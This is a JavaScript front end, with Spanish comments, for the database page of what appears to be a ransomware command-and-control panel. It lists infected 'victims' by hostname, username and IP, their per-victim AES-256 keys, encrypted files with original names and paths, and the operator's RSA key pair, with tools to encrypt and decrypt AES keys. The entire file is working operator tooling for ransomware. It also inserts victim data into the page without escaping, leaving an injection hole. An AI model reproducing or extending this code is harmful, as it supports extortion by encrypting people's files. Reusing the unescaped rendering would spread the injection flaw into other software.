// ===============================
// LOGICA DE LA PAGINA DE BASE DE DATOS
// ===============================

let currentTab = 'victims';
let allData = {
  victims: [],
  keys: [],
  encrypted: []
};
let sortColumn = null;
let sortDirection = 'desc';

document.addEventListener('DOMContentLoaded', () => {
  console.log('Pagina de base de datos cargada');

  // Cambio de pestanas
  document.querySelectorAll('.tab-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      currentTab = btn.dataset.tab;
      sortColumn = null; // Reiniciar orden al cambiar pestanas
      renderizarTabla();
    });
  });

  // Filtro de busqueda
  document.getElementById('filterInput').addEventListener('input', renderizarTabla);

  // Carga inicial
  refrescarDatos();

  // Auto-refrescar cada 30 segundos
  setInterval(refrescarDatos, 30000);
});

async function refrescarDatos() {
  try {
    // Cargar estadisticas
    const statsRes = await fetch('/api/db/stats');
    const stats = await statsRes.json();
    document.getElementById('statVictims').textContent = stats.victims || 0;
    document.getElementById('statKeys').textContent = stats.keys || 0;
    document.getElementById('statEncrypted').textContent = stats.encrypted || 0;

    // Cargar todos los datos
    const [victimsRes, keysRes, encryptedRes] = await Promise.all([
      fetch('/api/db/victims'),
      fetch('/api/db/keys'),
      fetch('/api/db/encrypted')
    ]);

    const victimsData = await victimsRes.json();
    const keysData = await keysRes.json();
    const encryptedData = await encryptedRes.json();

    allData.victims = victimsData.data || [];
    allData.keys = keysData.data || [];
    allData.encrypted = encryptedData.data || [];

    // Cargar claves RSA
    try {
      const rsaRes = await fetch('/api/rsa-keys');
      const rsaData = await rsaRes.json();
      allData.rsa = rsaData;
    } catch (e) {
      console.log('Error cargando claves RSA:', e);
      allData.rsa = {};
    }

    renderizarTabla();
  } catch (e) {
    console.error('Error cargando datos:', e);
  }
}

function ordenarDatos(data, column) {
  if (!column) return data;

  return [...data].sort((a, b) => {
    let valA = a[column] || '';
    let valB = b[column] || '';

    // Manejar fechas
    if (column === 'created_at') {
      valA = new Date(valA).getTime();
      valB = new Date(valB).getTime();
    }

    if (typeof valA === 'string') valA = valA.toLowerCase();
    if (typeof valB === 'string') valB = valB.toLowerCase();

    if (sortDirection === 'asc') {
      return valA > valB ? 1 : valA < valB ? -1 : 0;
    } else {
      return valA < valB ? 1 : valA > valB ? -1 : 0;
    }
  });
}

function manejarOrden(column) {
  if (sortColumn === column) {
    sortDirection = sortDirection === 'asc' ? 'desc' : 'asc';
  } else {
    sortColumn = column;
    sortDirection = 'desc';
  }
  renderizarTabla();
}

function renderizarTabla() {
  const container = document.getElementById('tableContainer');
  const filter = document.getElementById('filterInput').value.toLowerCase();

  let data = allData[currentTab] || [];

  // Aplicar filtro
  if (filter) {
    data = data.filter(row => {
      return Object.values(row).some(val =>
        String(val).toLowerCase().includes(filter)
      );
    });
  }

  // Aplicar ordenamiento
  data = ordenarDatos(data, sortColumn);

  if (data.length === 0) {
    container.innerHTML = '<div class="no-data"><i class="ph ph-database" style="font-size:48px;"></i><p>No hay datos disponibles</p></div>';
    return;
  }

  let html = '';

  if (currentTab === 'victims') {
    html = renderizarTablaVictimas(data);
  } else if (currentTab === 'keys') {
    html = renderizarTablaClaves(data);
  } else if (currentTab === 'encrypted') {
    html = renderizarTablaCifrados(data);
  } else if (currentTab === 'rsa') {
    html = renderizarPestanaRSA(allData.rsa);
  }

  container.innerHTML = html;
}

function renderizarPestanaRSA(rsaData) {
  console.log('Renderizando pestana RSA');
  if (!rsaData || !rsaData.publicKey) return '<div class="no-data"><p>No hay claves RSA disponibles</p></div>';

  return `
    <div style="padding: 20px;">
      <div style="display:grid; grid-template-columns: 1fr 1fr; gap: 20px;">
        <!-- Public Key -->
        <div class="card" style="background:#f8f9fa; padding:20px; border-radius:8px; border:1px solid #e9ecef;">
          <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
            <h3 style="margin:0; font-size:16px; color:var(--dark);">Clave Pública RSA</h3>
            <button onclick="copyToClipboard(\`${rsaData.publicKey}\`)" class="copy-btn">
              <i class="ph ph-copy"></i> Copiar
            </button>
          </div>
          <pre style="background:#1e1e2d; color:#50cd89; padding:15px; border-radius:6px; overflow:auto; max-height:400px; font-size:11px;">${rsaData.publicKey}</pre>
        </div>

        <!-- Private Key -->
        <div class="card" style="background:#f8f9fa; padding:20px; border-radius:8px; border:1px solid #e9ecef;">
          <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
            <h3 style="margin:0; font-size:16px; color:var(--dark);">Clave Privada RSA</h3>
            <button onclick="copyToClipboard(\`${rsaData.privateKey}\`)" class="copy-btn">
              <i class="ph ph-copy"></i> Copiar
            </button>
          </div>
          <pre style="background:#1e1e2d; color:#f64e60; padding:15px; border-radius:6px; overflow:auto; max-height:400px; font-size:11px;">${rsaData.privateKey}</pre>
        </div>
      </div>
    </div>
  `;
}

function obtenerIconoOrden(column) {
  if (sortColumn !== column) return '<i class="ph ph-caret-up-down" style="opacity:0.3;"></i>';
  return sortDirection === 'asc'
    ? '<i class="ph ph-caret-up" style="color:var(--primary);"></i>'
    : '<i class="ph ph-caret-down" style="color:var(--primary);"></i>';
}

function renderizarTablaVictimas(data) {
  return `
    <table class="data-table">
      <thead>
        <tr>
          <th onclick="manejarOrden('uuid')" style="cursor:pointer;">UUID ${obtenerIconoOrden('uuid')}</th>
          <th onclick="manejarOrden('hostname')" style="cursor:pointer;">Hostname ${obtenerIconoOrden('hostname')}</th>
          <th onclick="manejarOrden('username')" style="cursor:pointer;">Usuario ${obtenerIconoOrden('username')}</th>
          <th onclick="manejarOrden('ip')" style="cursor:pointer;">IP ${obtenerIconoOrden('ip')}</th>
          <th onclick="manejarOrden('platform')" style="cursor:pointer;">SO ${obtenerIconoOrden('platform')}</th>
          <th onclick="manejarOrden('arch')" style="cursor:pointer;">Arch ${obtenerIconoOrden('arch')}</th>
          <th onclick="manejarOrden('status')" style="cursor:pointer;">Estado ${obtenerIconoOrden('status')}</th>
          <th onclick="manejarOrden('created_at')" style="cursor:pointer;">Fecha ${obtenerIconoOrden('created_at')}</th>
          <th>Acciones</th>
        </tr>
      </thead>
      <tbody>
        ${data.map(row => `
          <tr>
            <td class="mono" title="${row.uuid || ''}">${truncate(row.uuid, 12)}</td>
            <td><strong>${row.hostname || '-'}</strong></td>
            <td>${row.username || '-'}</td>
            <td>${row.ip || '-'}</td>
            <td>${formatearPlataforma(row.platform)}</td>
            <td>${row.arch || '-'}</td>
            <td class="${row.status === 'connected' ? 'status-connected' : 'status-disconnected'}">${row.status || '-'}</td>
            <td>${formatearFecha(row.created_at)}</td>
            <td>
              <div class="action-buttons">
                <button onclick="copiarAlPortapapeles('${row.uuid}')" class="copy-btn" title="Copiar UUID">
                  <i class="ph ph-copy"></i>
                </button>
                <button class="action-btn delete" onclick="eliminarVictima('${row.uuid}', '${row.hostname}')" title="Eliminar">
                  <i class="ph ph-trash"></i>
                </button>
              </div>
            </td>
          </tr>
        `).join('')}
      </tbody>
    </table>
  `;
}

function renderizarTablaClaves(data) {
  return `
    <table class="data-table">
      <thead>
        <tr>
          <th onclick="manejarOrden('uuid')" style="cursor:pointer;">UUID ${obtenerIconoOrden('uuid')}</th>
          <th onclick="manejarOrden('hostname')" style="cursor:pointer;">Hostname ${obtenerIconoOrden('hostname')}</th>
          <th onclick="manejarOrden('aes_key')" style="cursor:pointer;">Clave AES-256 ${obtenerIconoOrden('aes_key')}</th>
          <th onclick="manejarOrden('created_at')" style="cursor:pointer;">Fecha ${obtenerIconoOrden('created_at')}</th>
          <th>Acciones</th>
        </tr>
      </thead>
      <tbody>
        ${data.map(row => `
          <tr>
            <td class="mono" title="${row.uuid || ''}">${truncate(row.uuid, 12)}</td>
            <td><strong>${row.hostname || '-'}</strong></td>
            <td class="mono" style="max-width:400px;">
              <div style="display:flex; align-items:center; justify-content:space-between; gap:10px;">
                <span style="overflow:hidden; text-overflow:ellipsis;">${row.aes_key || '-'}</span>
              </div>
            </td>
            <td>${formatearFecha(row.created_at)}</td>
            <td>
              <div class="action-buttons">
                <button onclick="copiarAlPortapapeles('${row.aes_key}')" class="copy-btn" title="Copiar clave AES">
                  <i class="ph ph-copy"></i>
                </button>
                <button class="action-btn edit" onclick="editarClave('${row.uuid}', '${row.aes_key}')" title="Editar">
                  <i class="ph ph-pencil-simple"></i>
                </button>
                <button class="action-btn delete" onclick="eliminarClave('${row.uuid}')" title="Eliminar">
                  <i class="ph ph-trash"></i>
                </button>
              </div>
            </td>
          </tr>
        `).join('')}
      </tbody>
    </table>
  `;
}

function renderizarTablaCifrados(data) {
  return `
    <table class="data-table">
      <thead>
        <tr>
          <th onclick="manejarOrden('uuid')" style="cursor:pointer;">UUID ${obtenerIconoOrden('uuid')}</th>
          <th onclick="manejarOrden('hostname')" style="cursor:pointer;">Hostname ${obtenerIconoOrden('hostname')}</th>
          <th onclick="manejarOrden('file_name')" style="cursor:pointer;">Archivo ${obtenerIconoOrden('file_name')}</th>
          <th onclick="manejarOrden('original_name')" style="cursor:pointer;">Original ${obtenerIconoOrden('original_name')}</th>
          <th onclick="manejarOrden('directory')" style="cursor:pointer;">Directorio ${obtenerIconoOrden('directory')}</th>
          <th onclick="manejarOrden('iv')" style="cursor:pointer;">IV ${obtenerIconoOrden('iv')}</th>
          <th onclick="manejarOrden('created_at')" style="cursor:pointer;">Fecha ${obtenerIconoOrden('created_at')}</th>
          <th>Acciones</th>
        </tr>
      </thead>
      <tbody>
        ${data.map(row => `
          <tr>
            <td class="mono" title="${row.uuid || ''}">${truncate(row.uuid, 10)}</td>
            <td><strong>${row.hostname || '-'}</strong></td>
            <td>${row.file_name || '-'}</td>
            <td>${row.original_name || '-'}</td>
            <td title="${row.directory || ''}" style="max-width:180px; overflow:hidden; text-overflow:ellipsis;">${truncate(row.directory, 30)}</td>
            <td class="mono" title="${row.iv || ''}">${truncate(row.iv, 16)}</td>
            <td>${formatearFecha(row.created_at)}</td>
            <td>
              <div class="action-buttons">
                <button onclick="copiarAlPortapapeles('${row.iv}')" class="copy-btn" title="Copiar IV">
                  <i class="ph ph-copy"></i>
                </button>
                <button class="action-btn edit" onclick="alert('Editar no implementado')" title="Editar">
                  <i class="ph ph-pencil-simple"></i>
                </button>
                <button class="action-btn delete" onclick="alert('Eliminar no implementado')" title="Eliminar">
                  <i class="ph ph-trash"></i>
                </button>
              </div>
            </td>
          </tr>
        `).join('')}
      </tbody>
    </table>
  `;
}

function formatearFecha(dateStr) {
  if (!dateStr) return '-';
  const d = new Date(dateStr);
  return d.toLocaleDateString('es-ES') + ' ' + d.toLocaleTimeString('es-ES', { hour: '2-digit', minute: '2-digit' });
}

function formatearPlataforma(platform) {
  if (!platform) return '-';

  // Si ya es un string descriptivo (ej: 'Windows 10'), devolverlo tal cual
  if (platform.startsWith('Windows ') || platform === 'Linux' || platform === 'macOS') {
    return platform;
  }

  // Mapeo legacy para datos antiguos
  const labels = {
    'win32': 'Windows',
    'linux': 'Linux',
    'darwin': 'macOS'
  };
  return labels[platform] || platform;
}


function descargarClave(filename, b64Content) {
  try {
    const binaryString = window.atob(b64Content);
    const bytes = new Uint8Array(binaryString.length);
    for (let i = 0; i < binaryString.length; i++) {
      bytes[i] = binaryString.charCodeAt(i);
    }
    const blob = new Blob([bytes], { type: "application/octet-stream" });
    const link = document.createElement('a');
    link.href = window.URL.createObjectURL(blob);
    link.download = filename;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  } catch (e) {
    console.error('Error de descarga:', e);
    alert('Error al descargar clave');
  }
}


function truncate(str, len) {
  if (!str) return '-';
  return str.length > len ? str.substring(0, len) + '...' : str;
}

function copiarAlPortapapeles(text) {
  navigator.clipboard.writeText(text).then(() => {
    // Sin alerta para copias individuales
  }).catch(err => {
    console.error('Error al copiar:', err);
  });
}

// ================================
// Funciones de Editar y Eliminar Claves
// ================================

async function editarClave(uuid, currentKey) {
  const newKey = prompt('Editar clave AES (64 caracteres hex):', currentKey);
  if (newKey === null) return; // Cancelado

  if (newKey.length !== 64) {
    alert('La clave AES debe tener 64 caracteres hexadecimales');
    return;
  }

  try {
    const response = await fetch('/api/db/keys/update', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ uuid, aes_key: newKey })
    });

    if (response.ok) {
      alert('Clave actualizada correctamente');
      refrescarDatos();
    } else {
      const error = await response.json();
      alert('Error al actualizar: ' + (error.message || 'Error desconocido'));
    }
  } catch (err) {
    console.error('Error actualizando clave:', err);
    alert('Error de conexion al actualizar');
  }
}

async function eliminarClave(uuid) {
  if (!confirm('¿Estás seguro de eliminar esta clave? Esta acción no se puede deshacer.')) {
    return;
  }

  try {
    const response = await fetch('/api/db/keys/delete', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ uuid })
    });

    if (response.ok) {
      alert('Clave eliminada correctamente');
      refrescarDatos();
    } else {
      const error = await response.json();
      alert('Error al eliminar: ' + (error.message || 'Error desconocido'));
    }
  } catch (err) {
    console.error('Error eliminando clave:', err);
    alert('Error de conexion al eliminar');
  }
}

async function eliminarVictima(uuid, hostname) {
  if (!confirm(`¿Estás seguro de eliminar la víctima ${hostname || uuid}? Esto también eliminará su clave y archivos cifrados registrados.`)) {
    return;
  }

  try {
    const response = await fetch('/api/db/victims/delete', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ uuid })
    });

    if (response.ok) {
      alert('Victima eliminada correctamente');
      refrescarDatos();
    } else {
      const error = await response.json();
      alert('Error al eliminar: ' + (error.message || 'Error desconocido'));
    }
  } catch (err) {
    console.error('Error eliminando victima:', err);
    alert('Error de conexion al eliminar');
  }
}

// ================================
// Extraccion de Parametros RSA para CrypTool v2
// ================================

async function extraerParametrosRSA() {
  try {
    const publicPem = document.getElementById('rsa-public-pem')?.textContent || '';
    const privatePem = document.getElementById('rsa-private-pem')?.textContent || '';

    if (!publicPem) {
      alert('No hay claves RSA disponibles');
      return;
    }

    // Parsear clave publica
    const publicKey = await importarClavePublicaRSA(publicPem);
    const exportedPublic = await crypto.subtle.exportKey('jwk', publicKey);

    // Extraer N y e de la clave publica
    const n = base64UrlAHex(exportedPublic.n);
    const e = base64UrlAHex(exportedPublic.e);
    const nDecimal = base64UrlABigInt(exportedPublic.n).toString();
    const eDecimal = base64UrlABigInt(exportedPublic.e).toString();

    // Update UI
    document.getElementById('rsa-n-value').textContent = n;
    document.getElementById('rsa-n-decimal').textContent = nDecimal;
    document.getElementById('rsa-e-value').textContent = eDecimal;
    document.getElementById('rsa-e-hex').textContent = `Hex: ${e}`;

    // Intentar parsear clave privada para d
    if (privatePem) {
      try {
        const privateKey = await importarClavePrivadaRSA(privatePem);
        const exportedPrivate = await crypto.subtle.exportKey('jwk', privateKey);

        const d = base64UrlAHex(exportedPrivate.d);
        const dDecimal = base64UrlABigInt(exportedPrivate.d).toString();

        document.getElementById('rsa-d-value').textContent = d;
        document.getElementById('rsa-d-decimal').textContent = dDecimal;
      } catch (privErr) {
        console.log('No se pudo extraer d de clave privada:', privErr);
        document.getElementById('rsa-d-value').textContent = 'Error al extraer';
      }
    }

    console.log('Parametros RSA extraidos exitosamente');

  } catch (err) {
    console.error('Error extrayendo parametros RSA:', err);
    alert('Error al extraer parametros: ' + err.message);
  }
}

async function importarClavePublicaRSA(pem) {
  const pemContents = pem
    .replace(/-----BEGIN PUBLIC KEY-----/, '')
    .replace(/-----END PUBLIC KEY-----/, '')
    .replace(/\s/g, '');

  const binaryDer = Uint8Array.from(atob(pemContents), c => c.charCodeAt(0));

  return await crypto.subtle.importKey(
    'spki',
    binaryDer.buffer,
    { name: 'RSA-OAEP', hash: 'SHA-256' },
    true,
    ['encrypt']
  );
}

async function importarClavePrivadaRSA(pem) {
  const pemContents = pem
    .replace(/-----BEGIN PRIVATE KEY-----/, '')
    .replace(/-----END PRIVATE KEY-----/, '')
    .replace(/-----BEGIN RSA PRIVATE KEY-----/, '')
    .replace(/-----END RSA PRIVATE KEY-----/, '')
    .replace(/\s/g, '');

  const binaryDer = Uint8Array.from(atob(pemContents), c => c.charCodeAt(0));

  return await crypto.subtle.importKey(
    'pkcs8',
    binaryDer.buffer,
    { name: 'RSA-OAEP', hash: 'SHA-256' },
    true,
    ['decrypt']
  );
}

function base64UrlAHex(base64url) {
  // Convertir base64url a base64
  let base64 = base64url.replace(/-/g, '+').replace(/_/g, '/');
  while (base64.length % 4) base64 += '=';

  // Decodificar y convertir a hex
  const binary = atob(base64);
  let hex = '';
  for (let i = 0; i < binary.length; i++) {
    hex += binary.charCodeAt(i).toString(16).padStart(2, '0');
  }
  return hex;
}

function base64UrlABigInt(base64url) {
  const hex = base64UrlAHex(base64url);
  return BigInt('0x' + hex);
}

// Cifrar clave AES con RSA para verificacion
async function cifrarAESConRSA() {
  try {
    const aesKeyHex = document.getElementById('aes-key-input')?.value?.trim();
    const publicPem = document.getElementById('rsa-public-pem')?.textContent || '';

    if (!aesKeyHex) {
      alert('Ingresa una clave AES (64 caracteres hex)');
      return;
    }

    if (aesKeyHex.length !== 64) {
      alert(`La clave AES debe tener 64 caracteres. Tienes: ${aesKeyHex.length}`);
      return;
    }

    if (!publicPem) {
      alert('No hay clave pública RSA disponible');
      return;
    }

    // Convertir hex a bytes
    const aesKeyBytes = new Uint8Array(aesKeyHex.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));

    // Importar clave publica
    const publicKey = await importarClavePublicaRSA(publicPem);

    // Cifrar con RSA-OAEP
    const encrypted = await crypto.subtle.encrypt(
      { name: 'RSA-OAEP' },
      publicKey,
      aesKeyBytes
    );

    // Convertir a base64
    const encryptedBase64 = btoa(String.fromCharCode(...new Uint8Array(encrypted)));

    // Mostrar resultado
    document.getElementById('rsa-encrypt-result').textContent = encryptedBase64;

    console.log('Clave AES cifrada exitosamente');

  } catch (err) {
    console.error('Error cifrando clave AES:', err);
    document.getElementById('rsa-encrypt-result').textContent = 'Error: ' + err.message;
  }
}

// Descifrar clave AES con clave privada RSA para verificacion
async function descifrarAESConRSA() {
  try {
    const encryptedBase64 = document.getElementById('encrypted-aes-input')?.value?.trim();
    const privatePem = document.getElementById('rsa-private-pem')?.textContent || '';

    if (!encryptedBase64) {
      alert('Ingresa la clave cifrada (Base64)');
      return;
    }

    if (!privatePem) {
      alert('No hay clave privada RSA disponible');
      return;
    }

    // Convertir base64 a bytes
    const encryptedBytes = Uint8Array.from(atob(encryptedBase64), c => c.charCodeAt(0));

    // Importar clave privada
    const privateKey = await importarClavePrivadaRSA(privatePem);

    // Descifrar con RSA-OAEP
    const decrypted = await crypto.subtle.decrypt(
      { name: 'RSA-OAEP' },
      privateKey,
      encryptedBytes
    );

    // Convertir a hex
    const decryptedHex = Array.from(new Uint8Array(decrypted))
      .map(b => b.toString(16).padStart(2, '0'))
      .join('');

    // Mostrar resultado
    document.getElementById('rsa-decrypt-result').textContent = decryptedHex;

    console.log('Clave AES descifrada exitosamente');

  } catch (err) {
    console.error('Error descifrando clave AES:', err);
    document.getElementById('rsa-decrypt-result').textContent = 'Error: ' + err.message;
  }
}

// Funciones globales para handlers onclick
window.refrescarDatos = refrescarDatos;
window.manejarOrden = manejarOrden;
window.copiarAlPortapapeles = copiarAlPortapapeles;
window.extraerParametrosRSA = extraerParametrosRSA;
window.descargarClave = descargarClave;
window.cifrarAESConRSA = cifrarAESConRSA;
window.descifrarAESConRSA = descifrarAESConRSA;
window.editarClave = editarClave;
window.eliminarClave = eliminarClave;
window.eliminarVictima = eliminarVictima;
